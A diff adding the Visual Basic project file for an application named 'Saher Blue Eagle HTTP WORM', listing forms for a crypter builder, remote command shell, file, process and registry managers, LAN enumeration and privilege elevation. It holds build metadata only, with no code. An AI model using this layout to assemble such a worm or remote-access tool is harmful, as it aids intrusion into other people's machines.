@@ -1,0 +1,312 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">x86</Platform>
+    <ProductVersion>
+    </ProductVersion>
+    <SchemaVersion>2.0</SchemaVersion>
+    <ProjectGuid>{12D0E219-151E-4686-B143-CF1E38FC497C}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <StartupObject>Saher_Blue_Eagle_WORM.My.MyApplication</StartupObject>
+    <RootNamespace>Saher_Blue_Eagle_WORM</RootNamespace>
+    <AssemblyName>Saher_Blue_Eagle_WORM</AssemblyName>
+    <FileAlignment>512</FileAlignment>
+    <MyType>WindowsForms</MyType>
+    <TargetFrameworkVersion>v3.5</TargetFrameworkVersion>
+    <TargetFrameworkProfile>Client</TargetFrameworkProfile>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <PublishUrl>C:\Users\Admin\Desktop\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ProductName>Saher Blue Eagle HTTP WORM</ProductName>
+    <PublisherName>Saher Blue Eagle</PublisherName>
+    <SuiteName>Blue Eagle Http Listener OpenSource</SuiteName>
+    <AutorunEnabled>true</AutorunEnabled>
+    <ApplicationRevision>1</ApplicationRevision>
+    <ApplicationVersion>1.0.0.1</ApplicationVersion>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <PublishWizardCompleted>true</PublishWizardCompleted>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DefineDebug>true</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DocumentationFile>Saher_Blue_Eagle_WORM.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|x86' ">
+    <PlatformTarget>x86</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <DefineDebug>false</DefineDebug>
+    <DefineTrace>true</DefineTrace>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DocumentationFile>Saher_Blue_Eagle_WORM.xml</DocumentationFile>
+    <NoWarn>42016,41999,42017,42018,42019,42032,42036,42020,42021,42022</NoWarn>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionExplicit>On</OptionExplicit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionCompare>Binary</OptionCompare>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionStrict>Off</OptionStrict>
+  </PropertyGroup>
+  <PropertyGroup>
+    <OptionInfer>On</OptionInfer>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>SaherBlueEagle.ico</ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignAssembly>false</SignAssembly>
+  </PropertyGroup>
+  <PropertyGroup>
+    <AssemblyOriginatorKeyFile>
+    </AssemblyOriginatorKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <SignManifests>false</SignManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestCertificateThumbprint>03E002DB17452C2112E804DB8BDF1EE87191ACF2</ManifestCertificateThumbprint>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ManifestKeyFile>Saher_Blue_Eagle_WORM_TemporaryKey.pfx</ManifestKeyFile>
+  </PropertyGroup>
+  <PropertyGroup>
+    <GenerateManifests>false</GenerateManifests>
+  </PropertyGroup>
+  <PropertyGroup>
+    <TargetZone>Custom</TargetZone>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="PresentationCore" />
+    <Reference Include="PresentationFramework" />
+    <Reference Include="System" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+    <Reference Include="WindowsBase" />
+  </ItemGroup>
+  <ItemGroup>
+    <Import Include="Microsoft.VisualBasic" />
+    <Import Include="System" />
+    <Import Include="System.Collections" />
+    <Import Include="System.Collections.Generic" />
+    <Import Include="System.Data" />
+    <Import Include="System.Drawing" />
+    <Import Include="System.Diagnostics" />
+    <Import Include="System.Windows.Forms" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="ApplicationEvents.vb" />
+    <Compile Include="Build_crypt.Designer.vb">
+      <DependentUpon>Build_crypt.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Build_crypt.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Lan_Eunumeriation_Tool.Designer.vb">
+      <DependentUpon>Lan_Eunumeriation_Tool.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Lan_Eunumeriation_Tool.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="RunAsAdmin.vb" />
+    <Compile Include="Client.vb" />
+    <Compile Include="cmd_shell.Designer.vb">
+      <DependentUpon>cmd_shell.vb</DependentUpon>
+    </Compile>
+    <Compile Include="cmd_shell.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="File Manager.Designer.vb">
+      <DependentUpon>File Manager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="File Manager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Form1.Designer.vb">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Form1.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="FUNC.vb" />
+    <Compile Include="GeoIP.vb" />
+    <Compile Include="My Project\AssemblyInfo.vb" />
+    <Compile Include="My Project\Application.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Application.myapp</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Resources.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DesignTime>True</DesignTime>
+      <DependentUpon>Resources.resx</DependentUpon>
+    </Compile>
+    <Compile Include="My Project\Settings.Designer.vb">
+      <AutoGen>True</AutoGen>
+      <DependentUpon>Settings.settings</DependentUpon>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="NonAb.Designer.vb">
+      <DependentUpon>NonAb.vb</DependentUpon>
+    </Compile>
+    <Compile Include="NonAb.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="nono.Designer.vb">
+      <DependentUpon>nono.vb</DependentUpon>
+    </Compile>
+    <Compile Include="nono.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Process Manager.Designer.vb">
+      <DependentUpon>Process Manager.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Process Manager.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Registry_Editor.Designer.vb">
+      <DependentUpon>Registry_Editor.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Registry_Editor.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Rgv.Designer.vb">
+      <DependentUpon>Rgv.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Rgv.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="SQLform.Designer.vb">
+      <DependentUpon>SQLform.vb</DependentUpon>
+    </Compile>
+    <Compile Include="SQLform.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="Sql_login.Designer.vb">
+      <DependentUpon>Sql_login.vb</DependentUpon>
+    </Compile>
+    <Compile Include="Sql_login.vb">
+      <SubType>Form</SubType>
+    </Compile>
+    <Compile Include="ValiumAlert.Designer.vb">
+      <DependentUpon>ValiumAlert.vb</DependentUpon>
+    </Compile>
+    <Compile Include="ValiumAlert.vb">
+      <SubType>Form</SubType>
+    </Compile>
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Build_crypt.resx">
+      <DependentUpon>Build_crypt.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="cmd_shell.resx">
+      <DependentUpon>cmd_shell.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="File Manager.resx">
+      <DependentUpon>File Manager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Form1.resx">
+      <DependentUpon>Form1.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Lan_Eunumeriation_Tool.resx">
+      <DependentUpon>Lan_Eunumeriation_Tool.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="My Project\Resources.resx">
+      <Generator>VbMyResourcesResXFileCodeGenerator</Generator>
+      <LastGenOutput>Resources.Designer.vb</LastGenOutput>
+      <CustomToolNamespace>My.Resources</CustomToolNamespace>
+      <SubType>Designer</SubType>
+    </EmbeddedResource>
+    <EmbeddedResource Include="NonAb.resx">
+      <DependentUpon>NonAb.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="nono.resx">
+      <DependentUpon>nono.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Process Manager.resx">
+      <DependentUpon>Process Manager.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Registry_Editor.resx">
+      <DependentUpon>Registry_Editor.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Rgv.resx">
+      <DependentUpon>Rgv.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="SQLform.resx">
+      <DependentUpon>SQLform.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="Sql_login.resx">
+      <DependentUpon>Sql_login.vb</DependentUpon>
+    </EmbeddedResource>
+    <EmbeddedResource Include="ValiumAlert.resx">
+      <DependentUpon>ValiumAlert.vb</DependentUpon>
+    </EmbeddedResource>
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="My Project\app.manifest">
+      <SubType>Designer</SubType>
+    </None>
+    <None Include="My Project\Application.myapp">
+      <Generator>MyApplicationCodeGenerator</Generator>
+      <LastGenOutput>Application.Designer.vb</LastGenOutput>
+    </None>
+    <None Include="My Project\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <CustomToolNamespace>My</CustomToolNamespace>
+      <LastGenOutput>Settings.Designer.vb</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="SaherBlueEagle.ico" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Client.3.5">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1 Client Profile</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+    <BootstrapperPackage Include="Microsoft.Windows.Installer.3.1">
+      <Visible>False</Visible>
+      <ProductName>Windows Installer 3.1</ProductName>
+      <Install>true</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <Folder Include="Resources\" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.VisualBasic.targets" />
+  <!-- To modify your build process, add your task inside one of the targets below and uncomment it. 
+       Other similar extension points exist, see Microsoft.Common.targets.
+  <Target Name="BeforeBuild">
+  </Target>
+  <Target Name="AfterBuild">
+  </Target>
+  -->
+</Project>
